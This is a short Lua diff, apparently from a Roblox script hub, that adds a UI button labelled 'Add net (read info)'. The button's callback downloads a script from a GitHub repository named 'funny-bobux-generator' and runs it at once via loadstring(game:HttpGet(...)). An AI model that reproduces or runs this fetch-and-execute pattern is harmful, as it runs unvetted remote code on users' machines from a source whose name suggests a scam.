@@ -92,3 +92,17 @@ APage.Button({
         end,
     }
 })
+
+APage.Button({
+    Text = "Add net (read info)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ageud-gg/funny-bobux-generator/main/loadlib.lua"))()
+    end,
+    Menu = {
+        Information = function(self)
+            UI.Banner({
+                Text = "This is already implemented in the Reanimate but its for extra"            
+            })
+        end,
+    }
+})
